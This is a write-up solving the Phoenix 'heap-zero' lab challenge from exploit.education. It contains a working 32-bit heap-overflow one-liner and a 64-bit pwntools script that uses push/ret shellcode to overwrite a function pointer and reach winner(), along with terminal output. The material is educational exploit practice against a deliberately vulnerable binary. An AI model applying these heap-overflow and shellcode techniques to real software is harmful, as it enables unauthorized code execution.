## Solution

The goal is to redirect execution to the winner() function. This could be achieved by overwriting
the `fp` function pointer of `f`. `f` is located after `d` on the heap. `d` is filled using `strcpy`
without bounds checking. This means we can overflow the `name` field of `d` in order to overwrite
`f->fp`. Note that this will also overwrite control data of `f` which will probably make any call
to `free` crash later on.

Since there is no memory protection (like ASLR), we can simply find out the address of the `winner`
function using objdump:

```bash
user@phoenix-amd64:/opt/phoenix/i486$ objdump -d heap-zero | grep winner
08048835 <winner>:
```

Now we need the offset of `f->fp` from `d->name` which we can write arbitrary data to.
Given the informative output of the program we can easily deduct the offset by probing
the executable (e.g. using binary search or using a unique pattern). Alternatively,
by looking at the source, we know that the `data` struct uses 64 bytes of memory, followed
by 8 bytes of heap control structure for `f` (prev_size, size). This means the function pointer we want to overwrite
is located 72 bytes after `d->name`. This results in the following exploit:

```bash
./heap-zero `python -c 'print "A"*72 + "\x08\x04\x88\x35"[::-1]' `
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-zero `python -c 'print "A"*72 + "\x08\x04\x88\x35"[::-1]' `
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
```

Note that `[::-1]` reverses a string in Python.

## 64-bit version

The 64-bit version makes this challenge a bit trickier since the address of `winner` contains null bytes that will end the string when read with `strcpy`. Thus, to get to the `winner` function, we add a level of indirection. We put a short shellcode at the beginning of our buffer that jumps to the winner function (`push ADDR; ret`). Using the buffer overflow, we can overwrite the function pointer `fp` with the address of our buffer, which doesn't contain any null bytes. This is the exploit:                                                                                               
```bash
# getting the required addresses
user@phoenix-amd64:~$ /opt/phoenix/amd64/heap-zero test
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0x7ffff7ef6010, fp is at 0x7ffff7ef6060, will be calling 0x400ace

user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/heap-zero | grep winner
0000000000400abd <winner>:
```

```Python
import pwnlib
import struct

DATA_ADDR = 0x7ffff7ef6010
WINNER_ADDR = 0x400abd

pwnlib.context.arch = 'amd64'
shellcode = pwnlib.shellcraft.amd64.push(WINNER_ADDR)
shellcode += pwnlib.shellcraft.amd64.ret()

shellcode = pwnlib.asm.asm(shellcode, arch='amd64')

buf = shellcode + "A" * (80 - len(shellcode)) # offset between fp and buf is 80
buf += struct.pack("<Q", DATA_ADDR)

print buf
```

And running the exploit:

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/heap-zero $(python heap0_64.py)
-bash: warning: command substitution: ignored null byte in input

Nice!
